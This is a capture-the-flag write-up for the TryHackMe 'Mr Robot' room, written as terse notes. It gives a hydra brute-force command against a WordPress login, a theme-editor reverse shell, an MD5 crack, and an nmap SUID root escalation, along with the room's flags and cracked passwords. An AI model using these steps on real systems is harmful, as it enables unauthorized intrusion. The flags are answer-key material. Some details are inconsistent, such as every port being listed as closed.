# [Challenge](https://tryhackme.com/room/mrrobot)

ngl best machine so far

- # ENUM
	- ### nmap (`nmap -p- -A -T4 mrrobot`)
		- PORT    STATE  SERVICE VERSION
			22/tcp  closed ssh
			80/tcp  closed http
			443/tcp closed https

- # KEYS (OF 3)
	- `http://mrrobot/key-1-of-3.txt` -> `073403c8a58a1f80d943455fb30724b9`
	- `/home/robot/key-2-of-3.txt`: `822c73956184f694993bede3eb39f959`
	- `/home/root/key-3-of-3.txt` -> `04787ddef27c3dee1ee161b21670b4e4`

- # EXPLOITATION
	- That's a wordpress website. Let's run `wpscan --url http://mrrobot --enumerate u`:
		- There's a `robot.txt` file.
			- There's a file named `fsocity.dic`. It looks like a wordlist.
	- `http://mrrobot/wp-login.php`: the username `elliot` exists! (Mr Robot main character)
		- Remove duplicates from the file: `sort fsocity.dic | uniq > output.txt`
		- Let's try Bruteforcing the password with `hydra`: `hydra -l elliot -P output.txt mrrobot http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -V -I -t 50`
			- Password: `ER28-0652`
				- Let's login into WordPress
	- There's another user: `mich05654`
		- Password: `Dylan_2791`
	- Let's find out how to RevShell
		- There are some files in the Editor, even a `-php` file: perfect for our reverse shell script!
			- Our script is visible in `http://mrrobot/wp-content/themes/twentyfifteen/archive.org`
				- We're daemon!
				- `python3 -c "import pty; pty.spawn('/bin/bash')"`

- # PRIVILEGE ESCALATION
	- `/home/robot/password.raw-md5` -> `robot:c3fcd3d76192e4007dfb496cca67e13b` ----- (RAW-MD5) ----> `robot:abcdefghijklmnopqrstuvwxyz` (`john --format=Raw-MD5 hash.txt`)
		- We can now read the second key.
	- Let's run `linpeas.sh`
		- Nmap has SUID bit set!:
			- `nmap` -> `!sh`
				- We're ROOT!
